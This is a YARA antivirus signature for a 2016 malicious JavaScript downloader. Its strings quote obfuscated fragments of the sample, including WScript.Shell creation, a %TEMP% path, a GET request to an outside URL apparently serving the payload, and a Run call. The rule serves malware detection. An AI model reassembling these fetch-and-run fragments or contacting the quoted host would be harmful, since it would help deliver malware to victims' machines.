rule sig_20160427_8abd220f33b9c6912c08b12171a59122 {
  meta:
    description = "datamaliciousorder - file 20160427_8abd220f33b9c6912c08b12171a59122.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "54446e2f430c43cdae5ab20a36f83b6444d9750b8de03c10ca79080f0fa327ee"

  strings:
    $s1  = "function EvfyrAidqf() {return RqmhqDhagp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"BRp3Q6m" ascii
    $s2  = "function EvfyrAidqf() {return RqmhqDhagp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"BRp3Q6m" ascii
    $s3  = "function DcumqObpya(PlnyvXcceb, TrxjzZbmix){BszxkRousl = BszxkRousl * 1; return PlnyvXcceb - TrxjzZbmix;};" fullword ascii
    $s4  = "var RqmhqDhagp = function XnjceFvaka() {return MrxiaEjmir[QwqnoXmgtr](\"WScript\"+\".Shell\");}(), DipppRauyu = 11;" fullword ascii
    $s5  = "YethgPibsk[FakyjAzlak](\"G\" + \"ET\", \"http://directenergy.tv/l2isd\", false);" fullword ascii
    $s6  = "var MrxiaEjmir = this[\"WScript\"];" fullword ascii
    $s7  = "function JxxftPyjun(){return 23;};" fullword ascii
    $s8  = "function CkowrBmsyb(){return FrcjfZapli + \"\";};" fullword ascii
    $s9  = "if (YethgPibsk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s10 = "function PsmmeDkcfh() {return ((DyiniUoflo == true) && (DyiniUoflo == PtdsxSjqzw)) ? 1 : BszxkRousl;};" fullword ascii
    $s11 = "function YfowxWaycp(GxtfvRbrbf) {var MqswvEujdy = (1, 2, 3, 4, 5, GxtfvRbrbf); return MqswvEujdy;};" fullword ascii
    $s12 = "var PtdsxSjqzw = false;" fullword ascii
    $s13 = "PtdsxSjqzw = true; " fullword ascii
    $s14 = "DyiniUoflo = true; " fullword ascii
    $s15 = "}while (CfewtXqsew);" fullword ascii
    $s16 = "var StqimIaavt = false;" fullword ascii
    $s17 = "var DyiniUoflo = false;" fullword ascii
    $s18 = "var BnmhmAiupb = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "function YikncMliml(VbipsOnrhi){RqmhqDhagp[\"R\"+\"un\"](VbipsOnrhi, BszxkRousl, BszxkRousl);};" fullword ascii
    $s20 = "StqimIaavt = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}